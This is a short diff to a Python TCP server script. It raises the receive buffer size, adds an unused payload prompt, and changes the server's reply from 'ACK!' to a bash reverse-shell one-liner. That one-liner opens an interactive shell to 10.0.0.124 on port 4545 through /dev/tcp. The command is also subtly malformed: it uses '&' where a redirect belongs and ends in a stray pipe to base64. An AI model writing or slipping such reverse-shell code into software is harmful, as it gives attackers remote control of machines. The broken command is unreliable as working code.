@@ -16,12 +16,17 @@ print("[*] Listening on %s:%d" % (bind_ip, bind_port))
 # this is our client handling thread
 def handle_client(client_socket):
     # just print out what the client sends
-    request = client_socket.recv(1024)
+    request = client_socket.recv(4096)
+
+    payload = str(input("Enter Payload: "))
 
     print("[*] Received: %s" % request)
 
     # send back a packet
-    client_socket.send(b"ACK!")
+
+    client_socket.send(b'''
+        bash -c 'bash -i & /dev/tcp/10.0.0.124/4545 0>&1 | base64
+    ''')
     print(client_socket.getpeername())
     client_socket.close()
 
